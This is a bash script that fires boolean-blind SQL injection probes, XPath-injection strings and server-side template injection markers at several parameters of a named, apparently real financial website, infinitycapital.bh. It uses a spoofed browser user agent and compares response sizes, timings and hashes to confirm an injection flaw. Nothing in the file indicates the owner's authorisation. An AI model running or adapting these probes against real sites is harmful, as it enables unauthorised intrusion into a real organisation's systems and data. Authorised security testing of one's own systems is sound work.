#!/bin/bash
# Strict differential oracle test for the floor's claimed boolean-blind SQLi
# on / (params: page, id, search) and /api/ (id)
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36'
T='https://www.infinitycapital.bh'
d(){ # url label
  curl -sk -A "$UA" -m 25 "$1" -o /tmp/d.html -w "%{http_code}:%{size_download}:%{time_total}"
  echo "  $2  md5=$(md5sum /tmp/d.html|cut -c1-32)"
}
echo "=== / page param : TRUE vs FALSE ==="
d "$T/?page=2" "page=2            (baseline)"
d "$T/?page=2%20AND%201=1" "page=2 AND 1=1"
d "$T/?page=2%20AND%201=2" "page=2 AND 1=2"
d "$T/?page=2'%20AND%20'1'='1" "page=2' AND '1'='1"
d "$T/?page=2'%20AND%20'1'='2" "page=2' AND '1'='2"
d "$T/?page=999999" "page=999999 (oob)"
d "$T/?page=-1" "page=-1"
echo "=== / id + search ==="
d "$T/?id=1" "id=1 baseline"
d "$T/?id=1%20AND%201=1" "id=1 AND 1=1"
d "$T/?id=1%20AND%201=2" "id=1 AND 1=2"
d "$T/?search=test" "search=test baseline"
d "$T/?search=test'%20AND%20'1'='1" "search AND 1=1"
d "$T/?search=test'%20AND%20'1'='2" "search AND 1=2"
echo "=== /api/?id=1 (floor claimed SQLi) ==="
d "$T/api/?id=1" "api id=1 baseline"
d "$T/api/?id=1%20AND%201=1" "api id AND 1=1"
d "$T/api/?id=1%20AND%201=2" "api id AND 1=2"
d "$T/api?id=1" "api(no slash) id=1"
echo "=== /?zzz=1 xpath / template / misc markers ==="
d "$T/?zzz=1" "zzz=1 baseline"
d "$T/?zzz=1%27%20or%20%271%27%3D%271" "zzz xp-inject"
d "$T/?zzz=%7B%7B7*7%7D%7D" "zzz ssti {{7*7}}"
d "$T/?zzz=\${7*7}" "zzz ssti \${7*7}"
echo DONE
